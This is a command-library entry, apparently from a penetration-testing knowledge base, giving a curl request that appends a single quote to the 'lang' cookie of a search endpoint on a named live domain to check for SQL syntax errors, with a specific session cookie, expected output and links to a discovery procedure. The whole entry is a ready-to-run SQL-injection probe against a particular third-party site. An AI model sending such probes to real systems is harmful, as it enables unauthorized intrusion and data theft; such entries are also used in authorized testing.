---
id: cmd-mtn-sqli-quote
data: >-
  curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" -H
  "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en';
  _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1;
  _gat_UA-44336198-10=1" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
  rv:68.0) Gecko/20100101 Firefox/68.0"
tags:
  - sqli
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.180Z'
verified: false
validated: true
submitted: true
---
# sqli-single-quote-injection

## Command

```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

## Description

Injects a single quote into the lang cookie to test for SQL syntax errors in the endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `lang=en'` | Injected cookie value | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Response containing SQL syntax error.

## Related

- [[commands/baseline-search-request]]
- [[procedures/Discover-SQL-Injection-in-Lang-Cookie]]
